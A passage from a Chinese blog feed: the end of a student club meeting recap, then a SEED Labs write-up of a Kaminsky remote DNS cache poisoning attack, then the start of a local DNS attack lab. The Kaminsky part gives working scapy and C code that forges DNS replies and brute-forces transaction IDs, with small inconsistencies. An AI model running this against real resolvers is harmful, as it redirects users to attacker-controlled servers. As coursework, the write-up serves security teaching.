文科复习法（电吉他分享）</h3><p><strong>记笔记是灵魂：</strong></p><ul><li>文科课程（尤其小班课）往往根据老师自己的研究方向出题</li><li>老师的PPT、课堂笔记、研究方案都很重要</li><li>不像大学物理有标准答案，这里个性化程度更高</li></ul><p><strong>思政、马原等公共课秘笈：</strong></p><ol><li>第一遍：理解全文，看一遍</li><li>第二遍：逐句背诵</li><li>第三遍：逐个知识点背</li><li>第四遍：整体复习</li></ol><p><strong>进阶技巧</strong>：</p><ul><li>主动看老师发的PPT</li><li>资料太多来不及？用AI总结主要内容，再自己查细节</li><li>结合老师PPT复习效果更佳</li></ul><h3 id="🌍-英语学习法（芒果分享）"><a href="#🌍-英语学习法（芒果分享）" class="headerlink" title="🌍 英语学习法（芒果分享）"></a>🌍 英语学习法（芒果分享）</h3><p><strong>听力突破：</strong></p><ul><li>听力很多是原题，教科书上的听力要多听</li><li><strong>影子跟读法</strong> ✨：把英文字幕打开，跟着说话者同时重复，既练听力又练口语，效果显著！</li><li>看美剧也是不错的选择</li></ul><p><strong>阅读与四六级：</strong></p><ul><li>阅读题靠刷题</li><li>4级相对简单（高中基础分类），6级必须刷题，否则容易挂科</li></ul><hr><h2 id="🎮-第四部分：互动游戏环节"><a href="#🎮-第四部分：互动游戏环节" class="headerlink" title="🎮 第四部分：互动游戏环节"></a>🎮 第四部分：互动游戏环节</h2><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260105131343720.jpeg" alt="QQ图片20260105124711(66)"></p><h3 id="游戏一：谁是卧底"><a href="#游戏一：谁是卧底" class="headerlink" title="游戏一：谁是卧底"></a>游戏一：谁是卧底</h3><p><strong>游戏规则简述：</strong></p><ul><li>12人分组，4个”卧底”，8个”平民”</li><li>每轮从第一个人开始描述卡片内容</li><li>每轮后投票淘汰一人</li><li>如果4个问题都问完还没淘汰所有卧底 → 卧底获胜；反之则平民获胜</li></ul><p><strong>关键点：</strong></p><ul><li>卧底要挑共同点来说，但不能撒谎</li><li>平民要根据描述寻找异常点</li><li>越到后面越难判断，悬念十足！</li></ul><p><strong>本场游戏亮点：</strong></p><ul><li>第一轮“川大”平民，“电科”卧底，大家都猜出来了</li></ul><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260105131343755.jpeg" alt="QQ图片20260105130607(56)"></p><ul><li>第二轮：“救护车”平民，“殡葬车”卧底，平民失败</li></ul><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260105131343798.jpeg" alt="QQ图片20260105130733(59)"></p><hr><h3 id="游戏二：拼照片猜人物"><a href="#游戏二：拼照片猜人物" class="headerlink" title="游戏二：拼照片猜人物"></a>游戏二：拼照片猜人物</h3><p><strong>游戏规则：</strong></p><ul><li>收集社团成员的照片片段</li><li>分组后拼完整图片并大声说出名字</li><li>按用时排名，最快完成者获胜</li></ul><p><strong>比赛过程：</strong></p><ul><li>第一轮拼的都是在场的社团成员</li><li>第二轮加入不在场但在社团的同学</li><li>有些小伙伴的脸被”暴露”得一塌糊涂，引发全场欢笑</li></ul><hr><h2 id="🎂-第五部分：温暖的结尾时刻"><a href="#🎂-第五部分：温暖的结尾时刻" class="headerlink" title="🎂 第五部分：温暖的结尾时刻"></a>🎂 第五部分：温暖的结尾时刻</h2><h3 id="惊喜蛋糕环节"><a href="#惊喜蛋糕环节" class="headerlink" title="惊喜蛋糕环节"></a>惊喜蛋糕环节</h3><p>我们的社长精心准备了蛋糕——几位社长坦言”不太会切蛋糕”，但这份用心足以温暖每一个人的心！大家围坐一起，在分享蛋糕的同时分享快乐。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260105131343841.jpeg" alt="QQ图片20260105124711(36)"></p><h3 id="学长学姐真心话"><a href="#学长学姐真心话" class="headerlink" title="学长学姐真心话"></a>学长学姐真心话</h3><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260105131343884.png" alt="WPS拼图0"></p><p><strong>芒果学姐：</strong></p><blockquote><p>和大家已经认识了一个学期了，然后感觉现在我已经都记住大家了，然后希望下一学期我们来了以后还能继续玩，大家在例会上玩得开心，每次开例会，其实我们开例会我们也都特别开心。给大家开例会，这是一个很好的放松的机会，然后也希望大家来例会的时候也有什么都说，然后有什么烦恼都可以分享，主要想让大家在紧张的学习中来放松一下,我们都把大家当成家人，然后也希望大家把自己当成家。对，然后最后就祝大家元旦快乐，2026年天天开心。</p></blockquote><p><strong>电吉他学长：</strong></p><blockquote><p>我觉得能够在这4个多月的时间能够认识大家，我就非常高兴，然后最后其实芒果学姐也说了很多了，我最后也祝大家期末考试顺利，我已经考完了。</p></blockquote><p><strong>淡水蓝学姐：</strong></p><blockquote><p>刚才芒果学姐和俊熙学长讲得差不多了。我想要非常感谢了，因为其实我们开例会，我其实感觉到收获感最多的反而是我们4个，因为每次都看见大家的笑脸，看见大家因为我们准备的这些东西而感到开心，我们就很幸福了。所以就是很感谢大家的陪伴，希望下年我们能够继续再度过一个学期的美好时光。</p></blockquote><p><strong>自信车学长：</strong></p><blockquote><p>首先很高兴认识大家，然后他们也祝完了，我就注意一下大家吃好喝好，然后祝大家期末都能考好好。</p></blockquote><p><strong>社团骨干们的祝福：</strong></p><ul><li>祝大家期末考试顺利</li><li>祝大家2026年天天开心，在社团中找到自己的位置</li><li>希望大家把社团当成家，把彼此当成家人</li><li>感谢大家的参与和支持，社团因为有大家而闪闪发光</li></ul>]]></content>
      
      
      <categories>
          
          <category> 社团活动 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分社例会 </tag>
            
            <tag> 致远分社 </tag>
            
            <tag> 活动记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Seed-Labs 2.0】**Remote DNS Cache Poisoning Attack Lab**</title>
      <link href="/posts/5a964963.html"/>
      <url>/posts/5a964963.html</url>
      
        <content type="html"><![CDATA[<h1>【Seed-Labs 2.0】<strong>Remote DNS Cache Poisoning Attack Lab</strong></h1><h3 id="环境搭建">环境搭建</h3><p>具体过程与DNS_Local部分相同，不同的是主机有所变化，实验网络结构:</p><p><a href="http://xn--www-c88de8370b1xe280axg2b0y9a.example.com">主要欺骗目标为www.example.com</a>,该域名真实ip为93.184.216.34，由ICANN管理。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214164838779.png" alt="image-20251214144929673"></p><h3 id="The-Kaminsky-Attack">The Kaminsky Attack</h3><p>前述已经完成在同一LAN下的DNS攻击，在同一个LAN下是可以直接看到query包。远程攻击缓存投毒的困难主要在于，响应包的事务id必须与请求包相匹配，而请求包的id通常是随机生成的，不在同一子网无法捕捉包看id，而自己暴力手段猜测id会败在缓存机制下，因为当我们成功之前，正确包已经到达被缓存，在time out 之前，dns server不会再向外查询。</p><p>Kaminsky提出的方案（主动构造对应域名的requests，同时大量不同id响应包响应dns server的请求以欺骗完成缓存中毒攻击）</p><h3 id="Task-2-Construct-DNS-request">Task 2: Construct DNS request</h3><p>1.如下伪造从user端发送dns查询给local dns server，最终目的为让local dns server向其他dns server发起dns 查询。<a href="http://xn--xx-tz2cp45aksf7zv8sfusat03u.example.com">因此查询字段为xx.example.com</a>,且不在缓存中，<a href="http://task2.py">task2.py</a>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all import *</span><br><span class="line">Qdsec = DNSQR(<span class="attribute">qname</span>=<span class="string">&quot;hjl.example.com&quot;</span>)<span class="built_in"></span></span><br><span class="line"><span class="built_in">dns </span>= DNS(<span class="attribute">id</span>=0xAAAA, <span class="attribute">qr</span>=0, <span class="attribute">qdcount</span>=1, <span class="attribute">ancount</span>=0, <span class="attribute">nscount</span>=0,</span><br><span class="line"><span class="attribute">arcount</span>=0, <span class="attribute">qd</span>=Qdsec)<span class="built_in"></span></span><br><span class="line"><span class="built_in">ip </span>= IP(<span class="attribute">dst</span>=<span class="string">&quot;10.9.0.53&quot;</span>, <span class="attribute">src</span>=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">udp = UDP(<span class="attribute">dport</span>=53,sport=60232,chksum=0)</span><br><span class="line">request = ip/udp<span class="built_in">/dns</span></span><br><span class="line"><span class="built_in"></span>send(request)</span><br></pre></td></tr></table></figure><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214164838967.png" alt="image-20251214150144615"></p><p>2.经wirshark抓包可以看到，local dns server 10.9.0.53向别的dns server发起查询。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214164839017.png" alt="image-20251214150122462"></p><h3 id="Task-3-Spoof-DNS-Replies">Task 3: Spoof DNS Replies</h3><p>1.编写欺骗程序，目的是向local dns server返回xxx.example.com的response，并欺骗其ns为攻击者的。代码task3.py如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all import *</span><br><span class="line">name = <span class="string">&quot;www.example.com&quot;</span></span><br><span class="line">domain = <span class="string">&quot;example.com&quot;</span></span><br><span class="line">ns = <span class="string">&quot;ns.attacker32.com&quot;</span></span><br><span class="line">Qdsec = DNSQR(<span class="attribute">qname</span>=name)</span><br><span class="line">Anssec = DNSRR(<span class="attribute">rrname</span>=name, <span class="attribute">type</span>=<span class="string">&#x27;A&#x27;</span>, <span class="attribute">rdata</span>=<span class="string">&#x27;1.2.3.4&#x27;</span>, <span class="attribute">ttl</span>=259200)</span><br><span class="line">NSsec = DNSRR(<span class="attribute">rrname</span>=domain, <span class="attribute">type</span>=<span class="string">&#x27;NS&#x27;</span>, <span class="attribute">rdata</span>=ns, <span class="attribute">ttl</span>=259200)<span class="built_in"></span></span><br><span class="line"><span class="built_in">dns </span>= DNS(<span class="attribute">id</span>=0xAAAA, <span class="attribute">aa</span>=1, <span class="attribute">rd</span>=1, <span class="attribute">qr</span>=1,</span><br><span class="line">          <span class="attribute">qdcount</span>=1, <span class="attribute">ancount</span>=1, <span class="attribute">nscount</span>=1, <span class="attribute">arcount</span>=0,</span><br><span class="line">          <span class="attribute">qd</span>=Qdsec, <span class="attribute">an</span>=Anssec, <span class="attribute">ns</span>=NSsec)<span class="built_in"></span></span><br><span class="line"><span class="built_in">ip </span>= IP(<span class="attribute">dst</span>=<span class="string">&quot;10.9.0.53&quot;</span>, <span class="attribute">src</span>=<span class="string">&quot;199.43.135.53&quot;</span>)</span><br><span class="line">udp = UDP(<span class="attribute">dport</span>=33333, <span class="attribute">sport</span>=53, <span class="attribute">chksum</span>=0)</span><br><span class="line">reply = ip/udp<span class="built_in">/dns</span></span><br><span class="line"><span class="built_in"></span>send(reply)</span><br></pre></td></tr></table></figure><p>其中，ns为攻击者的dns server，目标ip为local dns server的，源端口为53,我们需要伪造真正example.com给local dns server的response，因此，src ip为某example.com权威域名服务器的。而在实验环境配置时，我们已经将local dns server的源端口号固定为33333，因此dport =33333。以下为dig <a href="http://example.com">example.com</a> ns查到的多个权威域名服务器的name server(2 个)以及ip：</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214164839062.png" alt="image-20251214150638629"></p><p>通过wireshark抓包看到我们的response成功到达local dns server：</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214164839137.png" alt="image-20251214150648667"></p><h3 id="Task-4-Launch-the-Kaminsky-Attack">Task 4: Launch the Kaminsky Attack</h3><p>原理：随机对一个example.com的子域名(<a href="http://xn--aaaaa-gv5i.example.com">如aaaaa.example.com</a>)发起DNS请求，然后攻击者针对此域名查询发送DNS响应包，根据报文结构可知ID在2字节的范围内(0~65535)递增，可能的结果：</p><ul><li>命中ID的欺骗包在真的响应包之前到达，local dns缓存attacker ns作为example.com的权威服务器</li><li>否则，local dns先收到真的响应包，由于大概率没有这个随即构造的子域名，local dns并不会缓存权威服务器的信息，重新生成子域名即可继续攻击。</li></ul><p>读取二进制文件：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># DNS请求包</span></span><br><span class="line">FILE * f_req = fopen(<span class="string">&quot;ip_req.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">unsigned char ip_re<span class="string">q[MAX_FILE_SIZE]</span>;</span><br><span class="line"><span class="comment"># 第二个参数表示一次读取一个字节，返回读取的字节数</span></span><br><span class="line"><span class="keyword">int</span> n_req = fread(ip_req, <span class="number">1</span>, MAX_FILE_SIZE, f_req);</span><br><span class="line"><span class="comment"># DNS响应包</span></span><br><span class="line">FILE * f_resp = fopen(<span class="string">&quot;ip_resp.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">unsigned char ip_resp[MAX_FILE_SIZE];</span><br><span class="line"><span class="keyword">int</span> n_resp = fread(ip_resp, <span class="number">1</span>, MAX_FILE_SIZE, f_resp);</span><br></pre></td></tr></table></figure><p>攻击流程：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> a[<span class="number">26</span>]=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line"><span class="type">char</span> name[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(name,<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="comment">// 随机生成5字节，用来修改之前aaaaa占位符</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k=<span class="number">0</span>; k&lt;<span class="number">5</span>; k++)  name[k] = a[<span class="built_in">rand</span>() % <span class="number">26</span>];</span><br><span class="line">    <span class="comment">// 发送DNS请求包</span></span><br><span class="line">    <span class="built_in">send_dns_request</span>(ip_req,n_req,name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;request for %s.example.com\n&quot;</span>,name);</span><br><span class="line">    <span class="comment">// 发送DNS响应包，每次的id加1</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">65536</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">send_dns_response</span>(ip_resp,n_resp,name,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发送DNS请求包：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">send_dns_request</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * buffer,<span class="type">int</span> pkt_size,<span class="type">char</span> * name)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 将请求中的aaaaa改为本次攻击的随机生成的子域名</span></span><br><span class="line"><span class="built_in">memcpy</span>(buffer<span class="number">+41</span>,(<span class="type">unsigned</span> <span class="type">char</span>*)name,<span class="number">5</span>);</span><br><span class="line"><span class="built_in">send_raw_packet</span>(buffer,pkt_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发送DNS响应包：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">send_dns_response</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * buffer,<span class="type">int</span> pkt_size,<span class="type">char</span> * name,<span class="type">unsigned</span> <span class="type">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> tmp[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">*tmp=<span class="built_in">htons</span>(id);</span><br><span class="line">    <span class="comment">// 修改id</span></span><br><span class="line"><span class="built_in">memcpy</span>(buffer<span class="number">+28</span>,(<span class="type">void</span>*)tmp,<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 修改Qdsec中的aaaaa</span></span><br><span class="line"><span class="built_in">memcpy</span>(buffer<span class="number">+41</span>,(<span class="type">unsigned</span> <span class="type">char</span>*)name,<span class="number">5</span>);</span><br><span class="line"><span class="comment">// 修改Anssec中的aaaaa</span></span><br><span class="line">    <span class="built_in">memcpy</span>(buffer<span class="number">+64</span>,(<span class="type">unsigned</span> <span class="type">char</span>*)name,<span class="number">5</span>);</span><br><span class="line"><span class="built_in">send_raw_packet</span>(buffer,pkt_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过原始套接字将构造好的包发送出去：</p><h3 id="Task5-攻击效果">Task5 攻击效果</h3><p>local dns清除缓存：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rndc flush</span><br></pre></td></tr></table></figure><p>发起攻击：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o tsk4 tsk4.c</span><br><span class="line"><span class="built_in">sudo</span> ./task4</span><br></pre></td></tr></table></figure><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214164839195.png" alt="image-20251214163942279"></p><p>在local dns中查看缓存结果：<code> rndc dumpdb -cache &amp;&amp; grep attacker /var/cache/bind/dump.db</code>，当有attacker dns的缓存后停止攻击<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221210224942160.png" alt="image-20221210224942160"></p><p>user执行<code>dig www.example.com</code>，local dns返回的结果为attacker ns中配置的1.2.3.5，因为local dns在看到example.com时会直接向缓存中attacker dns询问。</p><p>![image-20251214164130089](./D:/工作/课程/大三上/网络攻防技术/lab11/【Seed-Labs 2.0】Remote DNS Cache Poisoning Attack Lab.assets/image-20251214164130011.png)</p><p>user执行<code>dig @ns.attacker32.com www.example.com</code>，attacker dns返回1,2,3,5<img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214164839265.png" alt="image-20251214164130089"></p>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Seed-Labs </tag>
            
            <tag> Web-Security </tag>
            
            <tag> DNS-Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Seed-Labs 2.0】Local DNS Attack Lab</title>
      <link href="/posts/c9917924.html"/>
      <url>/posts/c9917924.html</url>
      
        <content type="html"><![CDATA[<h1>【Seed-Labs 2.0】Local DNS Attack Lab</h1><h3 id="说在前面">说在前面</h3><p>本实验属为Seed-Labs 的DNS LAB 中的第一个实验，也是最简单的实验，该系列一共有五个实验:</p><ul><li><p>Local DNS Attack Lab</p></li><li><p>The Kaminsky Attack Lab</p></li><li><p>DNS Rebinding Attack Lab</p></li><li><p>DNS Infrastructure Lab</p></li><li><p>DNSSEC Lab</p></li></ul><p>本实验假设攻击者和DNS服务器在同一个局域网上，即攻击者可以观察到DNS查询消息。当攻击者和DNS服务器不在同一局域网上时，缓存中毒攻击就变得更具挑战性，这部分实验在 The Kaminsky Attack Lab 中。</p><h3 id="DNS知识先导">DNS知识先导</h3><p>这里我对DNS做一个简单的介绍，方便实验的进行和理解。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可以去下面的链接对DNS相关知识进行系统性的补充：</span><br><span class="line"></span><br><span class="line">https:<span class="regexp">//</span>ruanyifeng.com<span class="regexp">/blog/</span><span class="number">2016</span><span class="regexp">/06/</span>dns.html</span><br><span class="line">https:<span class="regexp">//</span>www.petekeen.net<span class="regexp">/dns-the-good-parts/</span></span><br><span class="line">https:<span class="regexp">//</span>www.geeksforgeeks.org<span class="regexp">/computer-networks/</span>domain-name-system-dns-<span class="keyword">in</span>-application-layer/</span><br></pre></td></tr></table></figure><h4 id="DNS的简介">DNS的简介</h4><p>DNS （Domain Name Syste） 中文直译为 域名系统。用于TCP/IP网络，提供将主机名和域名转换为IP地址的服务。简而言之，DNS 将在 Web 浏览器地址栏中键入的名称转换为 IP 地址。可以类比为一个电话本，将姓名与电话对应起来。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132410524.png" alt="image-20251214105728871"></p><h4 id="DNS的工作原理">DNS的工作原理</h4><p>虽然 DNS 最终只返回给用户一个IP地址，但是其查询过程并不简单，分为多个步骤。这里仅作能够帮助理解实验的简单讲解。</p><p><strong>步骤流程简化为：</strong> 用户输入域名 → 本地缓存 → 递归服务器 → 根服务器 → TLD服务器 → 权威服务器 → 返回IP地址。</p><p><strong>1.本地缓存查询</strong></p><ul><li><p>用户输入网址（如 <a href="http://www.example.com">www.example.com</a>），浏览器先查找本地缓存（浏览器、操作系统）。</p></li><li><p>如果找到对应的IP地址，直接返回，查询结束。</p></li></ul><p><strong>2.递归查询（向DNS服务器请求）</strong><br>如果本地没有缓存，操作系统会把请求发给递归DNS服务器（通常由你的网络服务商提供）</p><p><strong>3.递归服务器查找记录</strong><br>递归DNS服务器依次向以下上级服务器查询：</p><ul><li>根DNS服务器： 根服务器提供顶级域名（如 .com、.org）的DNS服务器地址。</li><li>顶级域名（TLD）服务器： TLD服务器返回目标域名的权威DNS服务器地址。</li><li>权威DNS服务器： 权威服务器存储域名的最终IP地址，并将结果返回递归服务器。</li></ul><p><strong>4.返回结果</strong></p><p>递归服务器将IP地址返回给用户的设备。<br>浏览器使用该IP地址连接目标服务器，加载网页。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132410706.png" alt="image-20251214104322657"></p><h4 id="53-号-端口">53 号 端口</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考链接：</span><br><span class="line">https:<span class="regexp">//</span>dcodesnippet.com<span class="regexp">/port-number-for-dns/</span></span><br><span class="line">https:<span class="regexp">//</span>www.networkstraining.com<span class="regexp">/what-is-dns/</span></span><br></pre></td></tr></table></figure><p>端口 53 是最知名和最常用的 DNS 端口号之一。它同时用于 TCP 和 UDP 协议，使其在处理 DNS 查询和响应方面具有多功能性，但是二者在使用范围上有区别。</p><p>其中最常用的是 UDP53。客户端设备（例如计算机、智能手机等）与 DNS 服务器通信以解析特定域名时（发送DNS请求），会使用此方法。当将 UDP 53 用于 DNS 时，查询数据包的最大大小为 512 字节。</p><p>TCP 53 主要用于区域传输以及查询超过 512 字节的情况。这在使用 DNSSEC 时有效，但是这会增加 DNS 查询（加密密钥、签名等）的额外开销。此外，现在使用 IPv6 时，查询回复数据包也可以大于 512 字节。</p><p><strong>本实验中的DNS请求和响应都是 UDP 53</strong></p><h3 id="Environment-Setup">Environment Setup</h3><p>本实验的相关文件参见官网 Local DNS Attack Lab<br>本实验建议在官方提供的虚拟机环境中进行，可以参考 SEED-labs-ubuntu 20.04 虚拟机环境搭建</p><h3 id="ContainerSetup">ContainerSetup</h3><p>本实验环境需要四台单独的计算机：一台用于受害者，一台用于本地 DNS 服务器，两台用于攻击者，如图所示。本实验侧重于本地攻击，因此我们将所有这些计算机放在同一个 LAN 上。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132410741.png" alt="image-20251214104145534"></p><p>进入实验的Labsetup文件夹后，输入 dcbuild拉取docker镜像，输入dcup 启动这些虚拟容器环境。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132410791.png" alt="image-20251214105805895"></p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132410840.png" alt="image-20251214110246172"></p><p>输入 dockps 查看所有的容器。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132410887.png" alt="image-20251214110321412"></p><h3 id="DNS-Configuration">DNS Configuration</h3><p><strong>Local DNS Server</strong>. 我们在本地 DNS 服务器上运行 BIND 9 DNS 服务器程序。BIND 9 的配置来自一个名为 /etc/bind/named.conf 的文件。该文件是主要配置文件，通常包含多个 “包含 ”条目，即实际配置存储在这些包含文件中。其中一个包含文件名为 /etc/bind/named.conf.options。实际配置就是在这里设置的。</p><ul><li>Simplification. DNS 服务器会在 DNS 查询中随机设置源端口号，这大大增加了攻击的难度。但仍有许多 DNS 服务器仍在使用可预测的源端口号。在本实验室中，为简单起见，我们在配置文件中将源端口号固定为 33333。</li><li>Turning off DNSSEC. DNSSEC 的引入是为了防止对 DNS 服务器的欺骗攻击。为了展示在没有这种保护机制的情况下攻击是如何进行的，我们在配置文件中关闭了这种保护机制。</li><li>DNS cache. 在攻击过程中，我们需要检查本地 DNS 服务器上的 DNS 缓存。以下两条命令与 DNS 缓存有关。第一条命令会将缓存内容转储到 /var/cache/bind/dump.db 文件，第二条命令会清除缓存。</li></ul><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rndc dumpdb<span class="punctuation">-</span>cache <span class="comment">// Dump the cache to the specified file</span></span><br><span class="line">rndc flush <span class="comment">// Flush the DNS cache</span></span><br></pre></td></tr></table></figure><ul><li>Forwarding the <a href="http://attacker32.com">attacker32.com</a> zone. 在本地 DNS 服务器中添加了一个转发区，因此如果有人查询 <a href="http://attacker32.com">attacker32.com</a> 域名，查询将被转发到该域名的名称服务器，而该名称服务器托管在 attacker 容器中。该区域条目放在 named.conf 文件中。</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zone <span class="string">&quot;attacker32.com&quot;</span> &#123;</span><br><span class="line"> type forward<span class="comment">;</span></span><br><span class="line"> forwarders &#123;</span><br><span class="line"> <span class="number">10.9</span>.<span class="number">0.153</span><span class="comment">;</span></span><br><span class="line"> &#125;<span class="comment">;</span></span><br><span class="line"> &#125;<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><strong>User machine.</strong> 用户容器 10.9.0.5 已被配置为使用 10.9.0.53 作为其本地 DNS 服务器。这是通过更改用户机器的解析器配置文件（/etc/resolv.conf）来实现的，因此服务器 10.9.0.53 被添加为文件中的第一个 nameserver 条目，即该服务器将被用作主 DNS 服务器。</p><p><strong>Attacker’s Nameserver.</strong> 在攻击者的名称服务器上，我们托管了两个区域。一个是攻击者的合法区域 <a href="http://attacker32.com">attacker32.com</a>，另一个是假冒的 <a href="http://example.com">example.com</a> 区域。这些区域在 /etc/bind/named.conf 中配置：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">zone <span class="string">&quot;attacker32.com&quot;</span> &#123;</span><br><span class="line"> type master<span class="comment">;</span></span><br><span class="line"> file <span class="string">&quot;/etc/bind/attacker32.com.zone&quot;</span><span class="comment">;</span></span><br><span class="line"> &#125;<span class="comment">;</span></span><br><span class="line"> zone <span class="string">&quot;example.com&quot;</span> &#123;</span><br><span class="line"> type master<span class="comment">;</span></span><br><span class="line"> file <span class="string">&quot;/etc/bind/example.com.zone&quot;</span><span class="comment">;</span></span><br><span class="line"> &#125;<span class="comment">;</span></span><br></pre></td></tr></table></figure><h3 id="Testing-the-DNS-Setup">Testing the DNS Setup</h3><p>前置工作： 在攻击者容器中查看域名 <a href="http://example.com">example.com</a> 的区域配置文件。后面的测试对照使用。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132410939.png" alt="image-20251214110951401"></p><p><strong>Get the IP address of <a href="http://ns.attacker32.com">ns.attacker32.com</a>.</strong><br>在user容器中执行 dig <a href="http://ns.attacker32.com">ns.attacker32.com</a> 以获取 <a href="http://ns.attacker32.com">ns.attacker32.com</a> 的IP地址。由于本地DNS的配置文件中添加了转发区域条目，所以本地DNS服务器会将请求转发到攻击者域名服务器。所以我们得到的IP应该是攻击者的IP 10.9.0.153 。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251214132410993.png" alt="image-20251214111230258"></p><p><strong>Get the IP address of <a href="http://www.example.com">www.example.com</a>.</strong><br>有两个域名服务器托管 <a href="http://example.com">example.com</a>，一个是官方的域名服务器，另一个是攻击者容器。在user 